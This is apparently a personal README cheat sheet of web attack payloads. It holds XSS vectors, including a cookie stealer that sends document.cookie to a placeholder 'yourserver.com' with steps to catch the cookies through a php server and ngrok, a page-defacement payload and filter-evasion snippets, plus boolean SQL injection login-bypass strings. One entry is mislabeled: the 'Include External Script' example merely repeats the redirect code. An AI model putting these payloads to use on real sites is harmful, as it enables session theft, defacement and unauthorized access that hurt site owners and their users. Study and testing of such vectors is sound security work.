# Capybara
The goal of this page is just to get attention.<br>
Why do i have to seriously write online some payloads when there are already [thousands of them](https://github.com/swisskyrepo/PayloadsAllTheThings) online for any type of vulnerability?
Anyway, i suggest these websites to study or review vulns!<br>
https://www.invicti.com/learn/<br>
https://www.hacksplaining.com/lessons<br>
https://portswigger.net/web-security
# Payloads

1) Generic XSS payloads
2) Various boolean based SQL injection payloads

## Generic xss payloads.

#### Cookie stealer
```js
<script>document.location=“http://yourserver.com/?c="+document.cookie;</script>
```
For example, to start a little server with php and ngrok i do:
`php -S localhost:<port>`
`ngrok http <port>`

#### Redirect
Achieve Open redirect
```js
<script>window.location="https://example.com"</script>
```

#### Include External Script
```js
<script>window.location="https://example.com"</script>
```

#### Overwrite body
Useful if a deface is needed
```js
<script>document.getElementsByTagName('body')[0].innerHTML="jamal";</script>
<script>document.body.innerHTML = 'jamal';</script>
```

### Other
Just search on google, you will find a lot of ways to escape filters
```js
<script>alert("hello")</script>
document.write(location.search("><svg onload=alert(1)>"))
<svg/onload=alert("hi")>
<img src=x onerror="alert('hello');">
<iframe src=”javascript:alert(1)”></iframe>
<var onmouseover="prompt(1)">move the cursor here</var>
<script>alert(window.origin)</script>
<script>alert(document.cookie)</script>
<script>confirm(document.domain)</script>
```

## Various boolean based SQL injection payloads
Taken from this website, "[**Sql injection cheat sheet by invicti**](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/)" (a read is strongly suggested)
```sql
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or '1'='1--
') or ('1'='1--
```
